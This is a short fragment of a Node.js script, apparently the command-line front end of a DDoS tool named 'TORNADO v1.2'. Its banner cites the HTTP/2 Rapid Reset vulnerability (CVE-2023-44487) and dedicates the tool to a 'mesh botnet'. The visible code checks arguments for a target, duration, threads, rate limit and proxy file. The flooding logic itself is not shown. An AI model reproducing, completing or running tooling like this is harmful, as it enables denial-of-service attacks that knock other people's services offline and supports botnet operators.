...
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`TORNADO v1.2 Method With RST STREAM (CVE-2023-44487) // Updated: 23.01.2024 // With love @rapidreset for mesh botnet`);
...
if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 1024) {
    console.error(`Error ratelimit can not high 1024`)
    process.exit(1);
}
